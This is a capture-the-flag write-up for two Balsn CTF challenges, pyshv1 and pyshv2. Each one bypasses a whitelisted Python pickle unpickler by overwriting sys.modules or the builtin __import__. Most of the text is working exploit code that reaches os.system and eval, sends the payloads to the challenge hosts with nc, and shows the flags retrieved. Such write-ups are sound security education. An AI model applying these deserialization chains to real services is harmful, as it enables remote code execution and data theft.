# pyshv1 (572)

The challenge contains two modules:

```python  
# File: securePickle.py

import pickle, io

whitelist = []

# See https://docs.python.org/3.7/library/pickle.html#restricting-globals  
class RestrictedUnpickler(pickle.Unpickler):  
   def find_class(self, module, name):  
       if module not in whitelist or '.' in name:  
           raise KeyError('The pickle is spoilt :(')  
       return pickle.Unpickler.find_class(self, module, name)

def loads(s):  
   """Helper function analogous to pickle.loads()."""  
   return RestrictedUnpickler(io.BytesIO(s)).load()

dumps = pickle.dumps  
```

```python  
# File: server.py

import securePickle as pickle  
import codecs

pickle.whitelist.append('sys')

class Pysh(object):  
   def __init__(self):  
       self.login()  
       self.cmds = {}

   def login(self):  
       user = input().encode('ascii')  
       user = codecs.decode(user, 'base64')  
       user = pickle.loads(user)  
       raise NotImplementedError("Not Implemented QAQ")

   def run(self):  
       while True:  
           req = input('$ ')  
           func = self.cmds.get(req, None)  
           if func is None:  
               print('pysh: ' + req + ': command not found')  
           else:  
               func()

if __name__ == '__main__':  
   pysh = Pysh()  
   pysh.run()  
```

We can provide a pickled string, and the unpickling is restricted to objects
in the `sys` module. I restrained from writing pickle bytecode by hand and
used only the `__reduce__` API. The only small hack is to create arbitrary
named attributes to be pickled, for example `sys.__dict__`. I wrote this
snippet to help with it:

```python  
import pickle, sys

class FakeMod(type(sys)):  
   modules = {}

   def __init__(self, name):  
       self.d = {}  
       super().__init__(name)

   def __getattribute__(self, name):  
       d = self()  
       return d[name]

   def __call__(self):  
       return object.__getattribute__(self, "d")

def attr(s):  
   mod, name = s.split(".")  
   if mod not in FakeMod.modules:  
       FakeMod.modules[mod] = FakeMod(mod)  
   d = FakeMod.modules[mod]()  
   if name not in d:  
       def f(): pass  
       f.__module__ = mod  
       f.__qualname__ = name  
       f.__name__ = name  
       d[name] = f  
   return d[name]

def dumps(obj):  
   # use python version of dumps  
   # which is easier to hack  
   pickle.dumps = pickle._dumps  
   orig = sys.modules  
   sys.modules = FakeMod.modules  
   s = pickle.dumps(obj)  
   sys.modules = orig  
   return s

a = attr("sys.__dict__")  
print(dumps(a))  
# b'\x80\x03csys\n__dict__\nq\x00.'  
```

Pickle uses `__reduce__` method of objects with a special interface. It allows
to call a function (which has to be picklable, i.e. be the part of the module)
with arbitrary (picklable) arguments. Finally, it allows to update the
`__dict__` of the output of the function, `.append()` objects to it and set
items on it. The following snippet simplifies this API into a single function
call:

```python  
def craft(func, *args, dict=None, list=None, items=None):  
   class X:  
       def __reduce__(self):  
           tup = func, tuple(args)  
           if dict or list or items:  
               tup += dict, list, items  
           return tup  
   return X()  
```  
Now we can, for example, easily dump `sys.__dict__` from the server:

```python  
obj = craft(attr("sys.displayhook"), attr("sys.__dict__"))  
```

```  
{'__name__': 'sys', '__doc__': ..., 'argv': ['/home/pyshv1/task/server.py']}  
```

## pyshv1 solution  
Let's look at the `Unpickler.find_class` method:  
```python  
def find_class(self, module, name):  
   ...  
   __import__(module, level=0)  
   if self.proto >= 4:  
       return _getattribute(sys.modules[module], name)[0]  
   else:  
       return getattr(sys.modules[module], name)  
```

So, pickle relies on the `sys.modules` mapping! Let us replace this attribute
with our own dict so that we can access attributes of objects other than the
actual sys module. In particular, we want to access modules in the mapping, so
we elegantly set `sys.modules[sys] = sys.modules`:

```python  
c1 = craft(  
   attr("sys.__setattr__"),  
   "modules", {"sys": sysattr("modules")}  
)  
```

We can now update module dicts using the `__reduce__` dict API, in particular
the whitelist:  
```python  
c2 = craft(attr("sys.__getitem__"), "securePickle", dict={"whitelist": ["sys",
"os"]})  
```

Now we can actually call e.g. the `os.system`:  
```python  
c3 = craft(attr("os.system"), "id; cat ../flag.txt")  
```

Assembling the full chain:  
```python  
c1 = craft(  
   attr("sys.__setattr__"),  
   "modules", {"sys": sysattr("modules")}  
)  
c2 = craft(attr("sys.__getitem__"), "securePickle", dict={"whitelist": ["sys",
"os"]})  
c3 = craft(attr("os.system"), "id; cat ../flag.txt")  
obj = craft(attr("sys.displayhook"), (c1, c2, c3))

s = dumps(obj)  
s = codecs.encode(s, "base64").replace(b"\n", b"")  
open("inp", "wb").write(s)  
os.system("(cat inp; echo) | nc -v pysh1.balsnctf.com 5421")  
```

```  
uid=1000(pyshv1) gid=1000(pyshv1) groups=1000(pyshv1)  
Balsn{p1Ck1iNg_s0m3_PiCklEs}  
```

# pyshv2 (857)  
In the second challenge the restricted pickle is a bit different. Not it calls
the `__import__` function:  
```python  
class RestrictedUnpickler(pickle.Unpickler):  
   def find_class(self, module, name):  
       if module not in whitelist or '.' in name:  
           raise KeyError('The pickle is spoilt :(')  
       module = __import__(module)  
       return getattr(module, name)  
```

Second, only an *empty* module `structs` is added to the whitelist (*how this
can be insecure???*):  
```python  
pickle.whitelist.append('structs')  
```

The rest is basically the same. In this challenge we have much less tools
compared to the rich `sys` module. However, there is `structs.__builtins__`
which is the same global `__builtins__` module. In particular, the change from
**pyshv1** is the use of the `__import__` function, which we can replace in
`__builtins__`. The idea is somewhat similar to the one with `sys.modules`:
the goal is to access attributes of objects other than the original module.
For achieving this, we replace `__import__` with `structs.__getatttribute__`.
As a result, `__import__("structs").attr` becomes `structs.structs.attr`. We
set the `structs.structs` to `structs.__dict__`: this allows us to call dict
methods:  
```py  
c1 = craft(attr("structs.__setattr__"), "structs", attr("structs.__dict__"))  
c2 = craft(  
   attr("structs.__getattribute__"),  
   "__builtins__",  
   items=[("__import__", attr("structs.__getattribute__"))]  
)  
```  
Let's populate the dict with builtins:  
```py  
bs = craft(attr("structs.get"), "__builtins__")  
c3 = craft(attr("structs.update"), bs)  
```

We can now replace `structs.structs` to the eval function:  
```py  
ev = craft(attr("structs.get"), "eval")  
c4 = craft(attr("structs.__setitem__"), "structs", ev)  
```

Finally, we call eval and assemble the whole chain:  
```py  
c1 = craft(attr("structs.__setattr__"), "structs", attr("structs.__dict__"))  
c2 = craft(  
   attr("structs.__getattribute__"),  
   "__builtins__",  
   items=[("__import__", attr("structs.__getattribute__"))]  
)  
bs = craft(attr("structs.get"), "__builtins__")  
c3 = craft(attr("structs.update"), bs)  
ev = craft(attr("structs.get"), "eval")  
c4 = craft(attr("structs.__setitem__"), "structs", ev)  
c5 = craft(attr("structs.__call__"), r'print(open("../flag.txt").read())')

obj = craft(attr("structs.__setattr__"), "code", [c1, c2, c3, c4, c5])  
s = dumps(obj)  
s = codecs.encode(s, "base64").replace(b"\n", b"")  
open("inp", "wb").write(s)  
os.system("(cat inp; echo) | nc -v pysh2.balsnctf.com 5422")  
```

```  
Balsn{CD_sP33duP_eVe3y7h1nG__Wh0_c4r3s_Th3_c0dE?}

Original writeup
(https://gist.github.com/hellman/b9804ce39ed8c4b1b0bf136459999a61).